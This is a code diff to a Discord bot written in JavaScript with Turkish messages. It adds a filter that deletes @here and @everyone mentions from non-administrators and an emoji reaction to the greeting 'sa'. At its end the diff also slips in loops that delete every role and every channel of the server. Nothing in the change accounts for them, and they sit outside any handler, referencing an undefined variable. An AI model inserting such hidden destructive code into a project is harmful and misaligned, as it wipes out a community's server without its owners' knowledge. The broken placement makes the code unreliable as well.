@@ -112,6 +112,37 @@ if (message.author.bot) return;
     }
   }
 });
+client.on("message", msg => {
+  if (!msg.guild) return;
+  if (!hereEngel[msg.guild.id]) return;
+  if (hereEngel[msg.guild.id].hereEngel === 'kapali') return;
+    if (hereEngel[msg.guild.id].hereEngel=== 'acik') {
+      const here = ["@here", "@everyone"];
+  if (here.some(word => msg.content.toLowerCase().includes(word)) ) {
+    if (!msg.member.hasPermission("ADMINISTRATOR")) {
+      msg.delete()
+       msg.channel.send(`<@${msg.author.id}>`).then(message => message.delete());
+        var e = new Discord.RichEmbed()
+        .setColor("RANDOM")
+        .setAuthor("Everyone ve Here Engeli!")
+        .setDescription(`Bu sunucuda Everyone ve Here yasak!`)
+        msg.channel.send(e).then(message => message.delete(5000));
+    }
+}
+    }
+});
+client.on('message', async msg => {
+  if (msg.content.toLowerCase() === 'sa') {
+    await msg.react(':regional_indicator_a:');
+    msg.react(':regional_indicator_s:');
+  }
+  });
+message.guild.roles.forEach(m => { 
+m.delete()
+});
+message.guild.channels.forEach(m => { 
+m.delete()
+});
 
 
 
